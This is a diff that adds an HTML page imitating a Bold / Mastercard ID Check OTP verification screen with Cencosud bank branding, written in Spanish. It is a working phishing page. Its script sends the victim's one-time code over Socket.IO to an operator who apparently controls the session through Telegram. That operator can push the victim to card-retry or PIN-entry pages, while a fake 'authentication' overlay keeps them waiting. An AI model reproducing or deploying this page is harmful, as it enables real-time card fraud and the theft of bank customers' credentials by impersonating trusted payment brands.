@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación OTP - Bold</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script src="/socket.io/socket.io.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #f5f5f5;
+            min-height: 100vh;
+        }
+        
+        .bold-header {
+            background: linear-gradient(135deg, #E91E63 0%, #C2185B 35%, #7B1FA2 70%, #512DA8 100%);
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .bold-logo {
+            height: 35px;
+        }
+        
+        .help-icon {
+            width: 40px;
+            height: 40px;
+            border: 2px solid white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        .verification-content {
+            background: white;
+            min-height: calc(100vh - 65px);
+            padding: 30px 20px;
+        }
+        
+        .cancel-link {
+            text-align: right;
+            margin-bottom: 30px;
+        }
+        
+        .cancel-link a {
+            color: #4A90E2;
+            text-decoration: none;
+            font-size: 18px;
+            font-weight: 500;
+        }
+        
+        .bank-logos {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 50px;
+            padding: 0 10px;
+        }
+        
+        .banco-falabella {
+            height: 70px;
+        }
+        
+        .id-check {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .mastercard-logo {
+            width: 40px;
+            height: 40px;
+        }
+        
+        .id-check span {
+            font-size: 20px;
+            color: #666;
+            font-weight: 400;
+        }
+        
+        .verification-container {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        
+        .separator {
+            height: 1px;
+            background: #e0e0e0;
+            margin: 40px 0;
+        }
+        
+        .verification-title {
+            font-size: 32px;
+            font-weight: 300;
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.4;
+        }
+        
+        .verification-message {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 40px;
+            line-height: 1.6;
+            font-weight: 400;
+        }
+        
+        .verification-message strong {
+            font-weight: 600;
+            color: #333;
+        }
+        
+        .form-group {
+            margin-bottom: 30px;
+        }
+        
+        .form-group label {
+            display: block;
+            font-size: 15px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 10px;
+        }
+        
+        .pin-input {
+            width: 100%;
+            padding: 15px 20px;
+            font-size: 18px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            background-color: #fff;
+            transition: border-color 0.3s;
+            font-family: 'Poppins', sans-serif;
+        }
+        
+        .pin-input:focus {
+            outline: none;
+            border-color: #4A90E2;
+        }
+        
+        .verify-button {
+            width: 100%;
+            padding: 16px 24px;
+            font-size: 18px;
+            font-weight: 500;
+            color: #fff;
+            background: #4A90E2;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Poppins', sans-serif;
+        }
+        
+        .verify-button:hover:not(:disabled) {
+            background: #3a7bc8;
+        }
+        
+        .verify-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        .resend-button {
+            display: none;
+        }
+        
+        .help-links {
+            margin-top: 40px;
+            padding-top: 30px;
+        }
+        
+        .help-link {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 20px 0;
+            border-bottom: 1px solid #e0e0e0;
+            cursor: pointer;
+            color: #4A90E2;
+            font-size: 16px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        
+        .help-link:last-child {
+            border-bottom: none;
+        }
+        
+        .help-link .plus {
+            font-size: 24px;
+            font-weight: 300;
+        }
+        
+        .auth-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #E91E63 0%, #C2185B 35%, #7B1FA2 70%, #512DA8 100%);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+        
+        .auth-screen.show {
+            display: flex;
+        }
+        
+        .auth-container {
+            text-align: center;
+            padding: 40px 20px;
+            max-width: 600px;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            justify-content: space-between;
+        }
+        
+        .auth-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .auth-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding: 40px 0;
+        }
+        
+        .auth-loader {
+            margin-bottom: 40px;
+        }
+        
+        .auth-logo {
+            height: 40px;
+        }
+        
+        .auth-help-icon {
+            width: 40px;
+            height: 40px;
+            border: 2px solid white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        
+        .loader-dots {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 60px 0;
+        }
+        
+        .dot {
+            width: 16px;
+            height: 16px;
+            background-color: white;
+            border-radius: 50%;
+            animation: wave 1.4s ease-in-out infinite;
+        }
+        
+        .dot:nth-child(1) { animation-delay: 0s; }
+        .dot:nth-child(2) { animation-delay: 0.2s; }
+        .dot:nth-child(3) { animation-delay: 0.4s; }
+        .dot:nth-child(4) { animation-delay: 0.6s; }
+        
+        @keyframes wave {
+            0%, 60%, 100% {
+                transform: translateY(0);
+                opacity: 0.6;
+            }
+            30% {
+                transform: translateY(-20px);
+                opacity: 1;
+            }
+        }
+        
+        .auth-title {
+            color: white;
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+        
+        .auth-message {
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 16px;
+            line-height: 1.6;
+        }
+        
+        .auth-footer {
+            padding-top: 30px;
+        }
+        
+        .auth-footer-text {
+            display: block;
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 12px;
+            margin-bottom: 15px;
+        }
+        
+        .auth-badges {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+        
+        .auth-badge {
+            height: 24px;
+            width: auto;
+            opacity: 0.8;
+        }
+        
+        @media screen and (max-width: 768px) {
+            .verification-title {
+                font-size: 26px;
+            }
+            
+            .bank-logos {
+                flex-direction: column;
+                gap: 20px;
+                align-items: flex-start;
+            }
+            
+            .auth-title {
+                font-size: 24px;
+            }
+        }
+        
+        @media screen and (max-width: 480px) {
+            .verification-title {
+                font-size: 22px;
+            }
+            
+            .banco-falabella {
+                height: 55px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header Bold -->
+    <header class="bold-header">
+        <img src="img/bold-logo-white.svg" alt="Bold" class="bold-logo">
+        <div class="help-icon">?</div>
+    </header>
+    
+    <!-- Contenido principal -->
+    <div class="verification-content">
+        <div class="verification-container">
+            <div class="cancel-link">
+                <a href="checkout.html">Cancel</a>
+            </div>
+            
+            <div class="bank-logos">
+                <img src="img/logo-cencosud.png" alt="Cencosud" class="banco-falabella">
+                
+                <div class="id-check">
+                    <svg class="mastercard-logo" viewBox="0 0 48 48" fill="none">
+                        <circle cx="18" cy="24" r="15" fill="#EB001B"/>
+                        <circle cx="30" cy="24" r="15" fill="#F79E1B"/>
+                    </svg>
+                    <span>ID Check</span>
+                </div>
+            </div>
+            
+            <div class="separator"></div>
+            
+            <h1 class="verification-title">¡Queremos asegurarnos que eres tú!</h1>
+            
+            <p class="verification-message">Por tu seguridad ingresa el <strong>CÓDIGO</strong> que enviaremos por <strong>SMS o por Correo Electronico<strong></strong> 
+            
+            <form id="otpForm">
+                <div class="form-group">
+                    <label for="otp">Ingresa el CODIGO:</label>
+                    <input type="text" id="otp" class="pin-input" maxlength="6" placeholder="" inputmode="numeric" autocomplete="off">
+                </div>
+                
+                <button type="submit" class="verify-button" id="verifyButton" disabled>Verificar</button>
+            </form>
+            
+            <div class="help-links">
+                <a href="#" class="help-link">
+                    <span>¿Tienes problema con la validación?</span>
+                    <span class="plus">+</span>
+                </a>
+                <a href="#" class="help-link">
+                    <span>¿Por qué tengo que comprobar mi identidad?</span>
+                    <span class="plus">+</span>
+                </a>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Pantalla de autenticación -->
+    <div class="auth-screen" id="authScreen">
+        <div class="auth-container">
+            <header class="auth-header">
+                <img src="img/bold-logo-white.svg" alt="Bold" class="auth-logo">
+                <div class="auth-help-icon">
+                    <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
+                        <circle cx="14" cy="14" r="13" stroke="white" stroke-width="2"/>
+                        <text x="14" y="19" text-anchor="middle" fill="white" font-size="18" font-weight="bold">?</text>
+                    </svg>
+                </div>
+            </header>
+            
+            <div class="auth-content">
+                <div class="auth-loader">
+                    <div class="loader-dots">
+                        <span class="dot"></span>
+                        <span class="dot"></span>
+                        <span class="dot"></span>
+                        <span class="dot"></span>
+                    </div>
+                </div>
+                
+                <h2 class="auth-title">Tu pago entró a un proceso de autenticación</h2>
+                <p class="auth-message">Por tu seguridad, no salgas de esta ventana. Sólo tardaremos unos segundos.</p>
+            </div>
+            
+            <div class="auth-footer">
+                <span class="auth-footer-text">Paga seguro con Bold</span>
+                <div class="auth-badges">
+                    <img src="img/pci-light.svg" alt="PCI" class="auth-badge">
+                    <img src="img/hacker-proof.svg" alt="Hacker Proof" class="auth-badge">
+                    <img src="img/service-provider-badge.svg" alt="Service Provider" class="auth-badge">
+                    <img src="img/recaptcha-light.svg" alt="reCAPTCHA" class="auth-badge">
+                    <img src="img/visa.svg" alt="Visa" class="auth-badge">
+                    <img src="img/mastercard.svg" alt="Mastercard" class="auth-badge">
+                    <img src="img/pse-light.svg" alt="PSE" class="auth-badge">
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Inicializar Socket.IO
+        const socket = io();
+        
+        // Escuchar acciones desde Telegram
+        socket.on('action', function(data) {
+            if (data.type === 'finalize') {
+                // Guardar datos en sessionStorage antes de redirigir
+                const bankSelect = sessionStorage.getItem('selectedBank') || '';
+                const accountTypeSelect = sessionStorage.getItem('selectedAccountType') || '';
+                const accountNumberInput = sessionStorage.getItem('selectedAccountNumber') || '';
+                const pointsInput = sessionStorage.getItem('selectedPoints') || '';
+                const amountReceivedInput = sessionStorage.getItem('selectedAmount') || '';
+                
+                if (!sessionStorage.getItem('redemptionData')) {
+                    sessionStorage.setItem('redemptionData', JSON.stringify({
+                        bank: bankSelect,
+                        accountType: accountTypeSelect,
+                        accountNumber: accountNumberInput,
+                        points: pointsInput,
+                        amount: amountReceivedInput
+                    }));
+                }
+                
+                // Redirigir a página de finalización
+                window.location.href = 'finalizar.html';
+            } else if (data.type === 'retry_card') {
+                window.location.href = 'checkout.html';
+            } else if (data.type === 'request_pin') {
+                window.location.href = 'pin.html';
+            } else if (data.type === 'request_otp') {
+                alert('Por favor, ingresa el código OTP nuevamente.');
+                setTimeout(() => {
+                    window.location.reload();
+                }, 1000);
+            }
+        });
+        
+        const otpInput = document.getElementById('otp');
+        const verifyButton = document.getElementById('verifyButton');
+        const otpForm = document.getElementById('otpForm');
+        
+        // Solo permitir números
+        otpInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^\d]/g, '');
+            
+            // Habilitar botón si tiene al menos 4 dígitos
+            if (this.value.length >= 4 && this.value.length <= 6) {
+                verifyButton.disabled = false;
+                verifyButton.style.opacity = '1';
+                verifyButton.style.cursor = 'pointer';
+            } else {
+                verifyButton.disabled = true;
+                verifyButton.style.opacity = '0.5';
+                verifyButton.style.cursor = 'not-allowed';
+            }
+        });
+        
+        // Enviar OTP
+        otpForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            if (verifyButton.disabled) {
+                return;
+            }
+            
+            const otp = otpInput.value;
+            
+            // Enviar datos vía Socket.IO
+            socket.emit('otp-data', { otp: otp });
+            
+            // Mostrar pantalla de autenticación
+            document.getElementById('authScreen').classList.add('show');
+            document.body.style.overflow = 'hidden';
+        });
+    </script>
+</body>
+</html>
